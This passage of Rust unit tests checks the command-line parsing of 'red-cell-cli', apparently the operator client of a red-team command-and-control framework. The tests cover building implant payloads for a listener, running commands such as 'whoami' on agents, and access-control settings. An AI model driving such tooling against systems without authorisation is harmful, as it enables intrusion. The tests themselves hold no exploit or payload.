            Some(Commands::Payload { action: PayloadCommands::Build { agent, .. } }) => {
                assert_eq!(agent, "demon", "--agent must default to 'demon'")
            }
            other => panic!("expected Payload::Build, got {other:?}"),
        }
    }

    #[test]
    fn payload_build_agent_flag_is_captured() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "payload",
            "build",
            "--listener",
            "http1",
            "--arch",
            "x64",
            "--format",
            "bin",
            "--agent",
            "phantom",
        ])
        .expect("payload build --agent phantom must parse");
        match cli.command {
            Some(Commands::Payload { action: PayloadCommands::Build { agent, .. } }) => {
                assert_eq!(agent, "phantom")
            }
            other => panic!("expected Payload::Build, got {other:?}"),
        }
    }

    // ── --wait-timeout flags ─────────────────────────────────────────────────

    #[test]
    fn agent_exec_wait_timeout_is_captured() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "agent",
            "exec",
            "abc123",
            "--cmd",
            "whoami",
            "--wait",
            "--wait-timeout",
            "120",
        ])
        .expect("agent exec --wait --wait-timeout must parse");
        match cli.command {
            Some(Commands::Agent { action: AgentCommands::Exec { wait_timeout, .. } }) => {
                assert_eq!(wait_timeout, Some(120));
            }
            other => panic!("expected Agent::Exec, got {other:?}"),
        }
    }

    #[test]
    fn agent_exec_wait_timeout_defaults_to_none_when_omitted() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "agent",
            "exec",
            "abc123",
            "--cmd",
            "whoami",
            "--wait",
        ])
        .expect("agent exec --wait without --wait-timeout must parse");
        match cli.command {
            Some(Commands::Agent { action: AgentCommands::Exec { wait_timeout, .. } }) => {
                assert!(
                    wait_timeout.is_none(),
                    "omitting --wait-timeout must yield None (default applied in handler)"
                );
            }
            other => panic!("expected Agent::Exec, got {other:?}"),
        }
    }

    #[test]
    fn agent_show_rejects_ambiguous_digit_only_id() {
        let err = Cli::try_parse_from(["red-cell-cli", "agent", "show", "1234"])
            .expect_err("ambiguous digit-only id must be rejected");
        let rendered = err.to_string();
        assert!(rendered.contains("ambiguous agent id '1234'"));
        assert!(rendered.contains("0x<hex>"));
    }

    #[test]
    fn session_accepts_explicit_decimal_default_agent() {
        let cli = Cli::try_parse_from(["red-cell-cli", "session", "--agent", "dec:42"])
            .expect("explicit decimal default agent must parse");
        match cli.command {
            Some(Commands::Session { agent }) => assert_eq!(agent, Some(AgentId::new(42))),
            other => panic!("expected Session, got {other:?}"),
        }
    }

    #[test]
    fn agent_exec_help_mentions_default_wait_timeout() {
        let mut cmd = Cli::command();
        let help = cmd
            .find_subcommand_mut("agent")
            .expect("agent subcommand")
            .find_subcommand_mut("exec")
            .expect("agent exec subcommand")
            .render_long_help()
            .to_string();

        assert!(help.contains("default: 60"), "agent exec help must mention the default timeout");
        assert!(help.contains("--wait-timeout"), "agent exec help must mention the override flag");
    }

    #[test]
    fn payload_build_wait_timeout_is_captured() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "payload",
            "build",
            "--listener",
            "http1",
            "--arch",
            "x86_64",
            "--format",
            "exe",
            "--wait",
            "--wait-timeout",
            "600",
        ])
        .expect("payload build --wait --wait-timeout must parse");
        match cli.command {
            Some(Commands::Payload { action: PayloadCommands::Build { wait_timeout, .. } }) => {
                assert_eq!(wait_timeout, Some(600));
            }
            other => panic!("expected Payload::Build, got {other:?}"),
        }
    }

    #[test]
    fn payload_build_wait_timeout_defaults_to_none_when_omitted() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "payload",
            "build",
            "--listener",
            "http1",
            "--arch",
            "x86_64",
            "--format",
            "exe",
        ])
        .expect("payload build without --wait-timeout must parse");
        match cli.command {
            Some(Commands::Payload { action: PayloadCommands::Build { wait_timeout, .. } }) => {
                assert!(
                    wait_timeout.is_none(),
                    "omitting --wait-timeout must yield None (default applied in handler)"
                );
            }
            other => panic!("expected Payload::Build, got {other:?}"),
        }
    }

    #[test]
    fn payload_build_help_mentions_default_wait_timeout() {
        let mut cmd = Cli::command();
        let help = cmd
            .find_subcommand_mut("payload")
            .expect("payload subcommand")
            .find_subcommand_mut("build")
            .expect("payload build subcommand")
            .render_long_help()
            .to_string();

        assert!(
            help.contains("default: 300"),
            "payload build help must mention the default timeout"
        );
        assert!(
            help.contains("--wait-timeout"),
            "payload build help must mention the override flag"
        );
    }

    #[test]
    fn audit_tail_help_mentions_default_poll_interval() {
        let mut cmd = Cli::command();
        let help = cmd
            .find_subcommand_mut("log")
            .expect("log subcommand")
            .find_subcommand_mut("tail")
            .expect("log tail subcommand")
            .render_long_help()
            .to_string();

        assert!(
            help.contains("default: 1"),
            "log tail help must mention the default poll interval"
        );
        assert!(help.contains("Polls every 1 second"), "log tail help must mention polling");
    }

    #[test]
    fn rbac_agent_groups_subcommands_parse() {
        let g = Cli::try_parse_from(["red-cell-cli", "agent", "groups", "DEADBEEF"])
            .expect("agent groups");
        assert!(matches!(
            g.command,
            Some(Commands::Agent { action: AgentCommands::Groups { .. } })
        ));

        let s = Cli::try_parse_from([
            "red-cell-cli",
            "agent",
            "set-groups",
            "AABBCCDD",
            "--group",
            "g1",
            "--group",
            "g2",
        ])
        .expect("agent set-groups");
        match s.command {
            Some(Commands::Agent { action: AgentCommands::SetGroups { id, group } }) => {
                assert_eq!(id, AgentId::new(0xAABBCCDD));
                assert_eq!(group, vec!["g1", "g2"]);
            }
            other => panic!("expected Agent::SetGroups, got {other:?}"),
        }
    }

    #[test]
    fn rbac_operator_agent_groups_subcommands_parse() {
        let show = Cli::try_parse_from(["red-cell-cli", "operator", "show-agent-groups", "alice"])
            .expect("show-agent-groups");
        assert!(matches!(
            show.command,
            Some(Commands::Operator { action: OperatorCommands::ShowAgentGroups { .. } })
        ));

        let set = Cli::try_parse_from([
            "red-cell-cli",
            "operator",
            "set-agent-groups",
            "bob",
            "--group",
            "tier1",
        ])
        .expect("set-agent-groups");
        match set.command {
            Some(Commands::Operator {
                action: OperatorCommands::SetAgentGroups { username, group },
            }) => {
                assert_eq!(username, "bob");
                assert_eq!(group, vec!["tier1"]);
            }
            other => panic!("expected Operator::SetAgentGroups, got {other:?}"),
        }
    }

    #[test]
    fn rbac_listener_access_subcommands_parse() {
        let a =
            Cli::try_parse_from(["red-cell-cli", "listener", "access", "http1"]).expect("access");
        assert!(matches!(
            a.command,
            Some(Commands::Listener { action: ListenerCommands::Access { .. } })
        ));

        let s = Cli::try_parse_from([
            "red-cell-cli",
            "listener",
            "set-access",
            "dns1",
            "--allow-operator",
            "u1",
            "--allow-operator",
            "u2",
        ])
        .expect("set-access");
        match s.command {
            Some(Commands::Listener {
                action: ListenerCommands::SetAccess { name, allow_operator },
            }) => {
                assert_eq!(name, "dns1");
                assert_eq!(allow_operator, vec!["u1", "u2"]);
            }
            other => panic!("expected Listener::SetAccess, got {other:?}"),
        }
    }
}
